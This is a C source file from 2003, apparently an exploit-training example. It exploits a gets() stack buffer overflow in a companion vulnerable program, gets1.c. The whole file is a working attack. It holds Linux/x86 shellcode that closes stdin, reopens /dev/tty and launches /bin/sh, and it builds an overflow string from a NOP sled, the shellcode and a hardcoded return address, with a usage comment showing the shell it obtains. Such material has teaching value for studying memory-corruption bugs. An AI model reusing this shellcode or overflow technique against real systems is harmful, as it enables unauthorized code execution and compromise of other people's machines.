/*
 * $Id: gets1-ex.c,v 1.1.1.1 2004/05/29 14:15:04 raptor Exp $
 *
 * gets1-ex.c - gets1.c exploit (vulnerable gets() function)
 * Copyright (c) 2003 Marco Ivaldi <raptor@0xdeadbeef.info>
 *
 * Function gets() is a bit harder to exploit than strcpy(), 'cause our buffer
 * must not contain newline ('\x0a') or end-of-file characters. We also need to 
 * close and re-open stdin (fd 0) to execute /bin/sh correctly, so we use a 
 * slightly modified shellcode.
 *
 * $ ./gets1-ex | ./gets1
 * Using ret: 0xbffffbf0
 * sh-2.05a$
 */

#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <stdlib.h>

#define BUF		265		// (66 * 4) + 1
#define NOP		0x90		// nop padding
#define	RET		0xbffffbf0	// hardcoded value found during tests

char sc[] = /* linux/x86 shellcode (8 + 23 + 24  = 55 bytes) */
/* close(0) */
"\x31\xc0\x31\xdb\xb0\x06\xcd\x80"
/* open("/dev/tty", O_RDWR | ...) */
"\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80"
/* execve("/bin/sh", ["/bin/sh"], NULL) */
"\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80";

unsigned long getesp()
{
	__asm__("movl %esp, %eax");
}

int main(int argc, char *argv[])
{
	char buf[BUF];
	int i, n, ret;

	int *p = (int *)(buf);

	if (argc < 2)
		ret = RET;
	else
		ret = getesp() - atoi(argv[1]); /* try -100 */

	fprintf(stderr, "Using ret: %p\n", ret);

	/* place our ret into the whole buffer */
	for (i = 0; i < BUF - 1; i += 4)
		*p++ = ret;
	*p = 0x0;

	/* pad the first half of the buffer with nops */
	for (i = 0; i < BUF / 2; i++)
		buf[i] = NOP;

	/* after the nops, place our shellcode */
	for (n = 0; n < strlen(sc); n++)
		buf[i++] = sc[n];

	/* output the evil string */
	fprintf(stdout, "%s", buf);
}
